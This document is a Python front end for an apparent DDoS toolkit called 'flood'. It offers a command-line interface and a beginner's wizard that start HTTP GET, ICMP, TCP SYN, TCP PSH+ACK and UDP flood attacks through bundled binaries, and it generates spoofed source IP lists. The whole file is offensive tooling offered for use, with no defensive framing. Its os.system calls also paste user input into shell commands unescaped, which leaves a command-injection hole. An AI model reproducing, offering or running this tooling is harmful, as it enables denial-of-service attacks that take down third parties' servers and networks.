#!/usr/bin/python3
# @author: 4anonz(Anonymous Hacks)


#import subprocess
import sys, time
from os import system, getenv

# porgram version
__version__ = "0.0.1"

# global variables
attack = ''
target = ''
url = ''
port = ''
bots_file = ''
number_of_packets = ''
output = ''

# colors
whi = "\033[1;37m"
grey = "\033[1;37m"
pur = "\033[1;35m"
red = "\033[1;31m"
gre = "\033[0;32m"
yel = "\033[1;33m"
cya = "\033[1;36m"
cafe = "\033[1;33m"
blu = "\033[1;34m"
res = "\033[0;37;40m"

# Simple interface
def print_i():
    print(f"{red}██████╗██╗     ██████╗   ██████╗ ██████╗  ") 
    print(f"{red}██╔═══╝██║    ██    ██╗ ██    ██╗██╔══██╗ ")
    print(f"{yel}██████╗██║    ██    ██║ ██    ██║██║  ██║ ")
    print(f"{yel}██╔═══╝██║    ██    ██║ ██    ██║██║  ██║ ")
    print(f"{blu}██║    ██████╗╚██████╔╝ ╚██████╔╝██████╔╝ ")
    print(f"{blu}╚═╝    ╚═════╝ ╚═════╝   ╚═════╝ ╚═════╝{pur}v{__version__}{res}")


def print_help(exit_code):
    print(f"""
{whi}Usage:{res} python3 flood [OPTIONS]
    flood version: {__version__}
    {whi}ATTACKS:{res}
    --get-flood                Perform the HTTP GET request flood DoS attack.
    --icmp-flood               Perform the ping ICMP flood DDoS attack.
    --psh-flood                Perform the TCP PSH+ACK flood DDoS attack.
    --syn-flood                Perform the TCP SYN flood DDoS attack.
    --udp-flood                Perform the UDP flood DDoS attack.
    HTTP flood:
    -u,  --url                 Specify the URL to attack.
    -p,  --port                Specify the port number for the HTTP GET reuqest flood.
    {whi}GENERAL OPTIONS:{res}
    -t,  --target              Specify the target IP address/hostname.
    -s,  --source              Specify a file path containing any number of spoofed source 
                               IP addresses(one per line) of this option is only available for the ICMP, 
                               TCP PSH+ACK, TCP SYN flood attacks, check the generating source IP
                               section. 
    -n,  --packets             Specify the number of packets to send or Number of GET
                               requests to send for the HTTP GET request flood.
    {whi}GENERATING SOURCE IP(s):{res}
    -g,  --generate            Use this option to specify the IP address of the network
                               for generating spoofed source IP(s), you can specify many ip addresses with
                               comma(,) seperated without white space.
    -o,  --write               Specify the name of the output file to write the IP addresses. 
    {whi}MISCELLANEOUS/MISC:{res}
    These options doesn't fit any of the category
    -w,  --wizard              Use a simple wizard interface to help for beginner users.
    -h,  --help                Print this help massage and exit.
    -v,  --version             Print program version and exit.
                 
    """)
    sys.exit(exit_code)
def is_root():
    user = getenv("SUDO_USER")
    if user is None:
        return False
    else:
        return True


# This wizard porvides a simple UI to help beginner users
def wizard():

    global attack, target, url, port, number_of_packets, bots_file, output
    print(f"""
{cya}|--{red}[{yel}01{red}]{res} Generate spoofed source IP(s).
{cya}|--{red}[{yel}02{red}]{res} HTTP GET flood attack.
{cya}|--{red}[{yel}03{red}]{res} ICMP flood attack.
{cya}|--{red}[{yel}04{red}]{res} TCP PSH+ACK flood attack.
{cya}|--{red}[{yel}05{red}]{res} TCP SYN flood attack.
{cya}|--{red}[{yel}06{red}]{res} UDP flood attack.  
{cya}|--{red}[{yel}00{red}]{res} Exit.
    """)

    tmp = 0
    print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Enter your choice{blu}]")
    choice = str(input(f"└─${res} "))
    
    # Check the users choice and do the work
    if choice == '0' or choice == '00':
        sys.exit(0)
    elif choice == '1' or choice == '01':

        print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Enter target's ip{blu}]")
        target = str(input(f"└─${res} "))
        print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Name of file to write output{blu}]")
        output = str(input(f"└─${res} "))

        # Find botnets
        print(f"\n{whi}[{gre}INFO{whi}]:{res} Please wait, Generating source IP(s)....")
        time.sleep(2)
        system(f"python3 src/generate_sourceIP.py {target} {output}")
        
        # inefficient
        #out = subprocess.run(['python3', 'botnets.py', target, output], capture_output=True)
        #print(out.stdout.decode())
    elif choice == '2' or choice == '02':

        print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Enter target's URL{blu}]")
        url = str(input(f"└─${res} "))

        try:
            print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Number of requests{blu}]")
            tmp = int(input(f"└─${res} "))
        except ValueError:
            print(f"{whi}[{red}ERROR{whi}]:{res} Excepting an integer value!")
            sys.exit(1)
        number_of_packets = str(tmp)
        port = '1'

        try:
            print("""If not sure skip this option by pressing ctl+c, 
            default value(s) will be use 80 for http and 443 for https""")
            print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Enter port number{blu}]")

            tmp = int(input(f"└─${res} "))
        except KeyboardInterrupt:
            port = '0'
        except ValueError:
            print(f"{whi}[{red}ERROR{whi}]:{res} Excepting an integer value!")
            sys.exit(1)
        if port == '1':
            port = str(tmp)
        # Run this srcipt
        system(f"python3 src/http_get_flood.py {url} {port} {number_of_packets}")

        # inefficient
        #out = subprocess.run(['python3', 'http_get_flood.py', url, port, number_of_packets], capture_output=True)
        #print(out.stdout.decode())

    elif choice == '3' or choice == '4' or choice == '5' or choice == '6' or choice == '03' or choice == '04' or choice == '05' or choice == '06':
        # Check if the user has root privilages
        if choice != '6' and choice != '06':
            if is_root() != True:
                print(f"{whi}[{red}ERROR{whi}]:{res} Root privileges is required for this type of attack, retry using {gre}sudo{res}")
                sys.exit(1)
        print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Enter target's hostname/IP{blu}]")
        target = str(input(f"└─${res} "))
        try:
            print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Number of packets to send{blu}]")
            tmp = int(input(f"└─${res} "))
        except ValueError:
            print(f"{whi}[{red}ERROR{whi}]:{res} Excepting an integer value!")
            sys.exit(1)
        number_of_packets = str(tmp)

        if choice != '6' and choice != '06':
            print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}File path containing spoofed IP{blu}]")
            bots_file = str(input(f"└─${res} "))

        if choice != '6' and choice != '06' and choice != '3' and choice != '03':
            print(f"{blu}┌──({whi}FLOOD{blu})-[~{yel}Port Number{blu}]")
            port = str(input(f"└─${res} "))

        if choice == '3' or choice == '03':
            system(f"./bin/icmp_flood {target} {bots_file} {number_of_packets}")
            exit(0)
        
        elif choice == '4' or choice == '04':
            system(f"./bin/tcp_psh_flood {target} {bots_file} {port} {number_of_packets}")
            exit(0)
        
        elif choice == '5' or choice == '05':
            system(f"./bin/tcp_syn_flood {target} {bots_file} {port} {number_of_packets}")
            exit(0)
        else:
            system(f"./bin/udp_flood {target} {number_of_packets}")
    else:
        print(f"{whi}[{red}ERROR{whi}]:{res} Invalid option {gre}{choice}{res}")
        exit(1)



def print_msg(option):
    print(f"{whi}[{red}ERROR{whi}]:{res} Invalid argument passed to the {gre}{option}{res} option.")
    sys.exit(1)


# Parsing the command line arguments
def parse_args():

    global attack, target, url, port, number_of_packets, bots_file, output
    argc = len(sys.argv)
    if argc == 1:
        print_help(1)
    tmp = 0
    cmd = ['-h','--help','-t','--target','-u', '--url','-p','port',
    '-s','--source','-o','--write','-w','--wizard','-g','--generate'
    '-v','--verions','-n','--packets']
    try:
        for i in range(argc):
            if i == 0:
                continue
            if sys.argv[i] == '-h' or sys.argv[i] == '--help':
                if argc > 2:
                    print_help(1)
                print_help(0)
            elif 'flood' in sys.argv[i]:
                attack = str(sys.argv[i])
            elif sys.argv[i] == '-t' or sys.argv[i] == '--target':
                if len(sys.argv[i+1]) < 1:
                    print_help(1)
                target = str(sys.argv[i+1])
            elif sys.argv[i] == '-u' or sys.argv[i] == '--url':
                if len(sys.argv[i+1]) < 1:
                    print_help(1)
                url = str(sys.argv[i+1])
            elif sys.argv[i] == '-p' or sys.argv[i] == '--port':
                if len(sys.argv[i+1]) < 1:
                    print_help(1)
                try:
                    tmp = int(sys.argv[i+1])
                except ValueError:
                    print_msg(sys.argv[i])
                port = int(sys.argv[i+1])
            elif sys.argv[i] == '-s' or sys.argv[i] == '--source':
                if len(sys.argv[i+1]) < 1:
                    print_help(1)
                bots_file = str(sys.argv[i+1])
            elif sys.argv[i] == '-n' or sys.argv[i] == '--packets':
                if len(sys.argv[i+1]) < 1:
                    print_help(1)
                try:
                    tmp = int(sys.argv[i+1])
                except ValueError:
                    print_msg()
                number_of_packets = str(sys.argv[i+1])
            elif sys.argv[i] == '-g' or sys.argv[i] == '--generate':

                if len(sys.argv[i+1]) < 1:
                    print_help(1)
                ip = str(sys.argv[i+1])
                file = ''
                # Check for the -o argument
                for j in range(argc):
                    if sys.argv[j] == '-o' or sys.argv[j] == '--write':
                        if len(sys.argv[j+1]) < 1:
                            print_help(1)
                        file = str(sys.argv[j+1])
                if not file:
                    print(f"{whi}[{red}ERROR{whi}]:{res} Missing argument.. please use the {gre}-o, --write{res} to specify where to write the output")
                    sys.exit(1)
                print("\n\n")
                print(f"\n{whi}[{gre}INFO{whi}]:{res} Please wait, Generating source IP(s)....")
                time.sleep(2)
                system(f"python3 src/generate_sourceIP.py {ip} {file}")

            elif sys.argv[i] == '-w' or sys.argv[i] == '--wizard':
                if argc > 2:
                    print_help(1)
                wizard()
            elif sys.argv[i] == '-v' or sys.argv[i] == '--version':
                if argc > 2:
                    print_help(1)
                print(f"\n{whi}flood version:{res} {__version__}")
                print(f"{whi}Github:{res} https://github.com/4anonz/flood")
                sys.exit(0)
            else:
                if not sys.argv[i] in cmd and not sys.argv[i-1] in cmd and not '-' in sys.argv[i-1]:
                    print(f"""
{whi}[{red}ERROR{whi}]:{res} Unexcepted additional argument {gre}{sys.argv[i]}{gre}.
Use the {gre}-h{res} or {gre}--help{res} flag for help message.
                    """)
                    sys.exit(1)
    except IndexError:
        print_help(1)
    
    #If the attack type is HTTP get request flood
    if attack == "--get-flood":
        if not url or not number_of_packets:
            print_help(1)
        if not port:
            port = '0'
        print(f"\n{whi}[{gre}INFO{whi}]:{res} Starting HTTP GET request flood DoS attack.......")
        time.sleep(2)
        system(f"python3 src/http_get_flood.py {url} {port} {number_of_packets}")
    # If the attack type is ping ICMP FLOOD
    elif attack == "--icmp-flood":
        # Check if the user a root previlages
        if is_root() != True:
            print(f"{whi}[{red}ERROR{whi}]:{res} Root privileges is required for this type of attack, retry using {gre}sudo{res}")
            sys.exit(1)
        # Check to make sure every required field is supplied
        # otherwise print a help message
        if not target or not bots_file or not number_of_packets:
            print_help(1)
        print(f"\n{whi}[{gre}INFO{whi}]:{res} Starting ping ICMP flood DDoS attack.......")
        system(f"./bin/icmp_flood {target} {bots_file} {number_of_packets}")
    elif attack == "--psh-flood" or attack == "--syn-flood":
        if is_root() != True:
            print(f"{whi}[{red}ERROR{whi}]:{res} Root privileges is required for this type of attack, retry using {gre}sudo{res}")
            sys.exit(1)
        if not target or not bots_file or not port or not number_of_packets:
            print_help(1)
        if attack == "--psh-flood":
            print(f"\n{whi}[{gre}INFO{whi}]:{res} Starting TCP PSH+ACK flood DDoS attack.......")
            system(f"./bin/tcp_psh_flood {target} {bots_file} {port} {number_of_packets}")
        else:
            print(f"\n{whi}[{gre}INFO{whi}]:{res} Starting TCP SYN flood DDoS attack.......")
            system(f"./bin/tcp_syn_flood {target} {bots_file} {port} {number_of_packets}")
    
    elif attack == "--udp-flood":
        if not target or not number_of_packets:
            print_help(1)
        print(f"\n{whi}[{gre}INFO{whi}]:{res} Starting UDP flood DDoS attack.......")
        system(f"./bin/udp_flood {target} {number_of_packets}")

        


try:
    print_i()
    parse_args()
except KeyboardInterrupt:
    print(f"\n{whi}[{yel}CRITICAL{whi}]:{res} User aborted(Ctl+C)")
    sys.exit(1)